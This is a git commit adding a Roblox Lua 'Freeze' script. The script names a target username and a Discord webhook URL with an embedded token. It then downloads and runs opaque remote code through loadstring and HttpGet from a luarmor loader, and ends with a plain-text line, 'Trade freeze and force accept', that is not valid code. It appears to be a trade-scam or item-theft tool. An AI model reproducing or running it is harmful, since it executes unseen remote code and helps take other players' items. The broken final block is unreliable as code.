e7481ecd196fd2ef938c0554db2ac27316ce22f6
sab-api <carlosignaa2019@gmail.com>
2026-09-10 21:11:01 -0300

    Add script Freeze_1789085460825.lua

---
+++ scripts/Freeze_1789085460825.lua
@@ -0,0 +1,14 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "Joisgaa"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1546713219635093604/7f4yFtPjxj6eQKqbDjJciO30j-9zYrUzbB052KmHvrHVrnYyao_FAusFuvgxDPcBEpDJ"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    Trade freeze and force accept
+end)
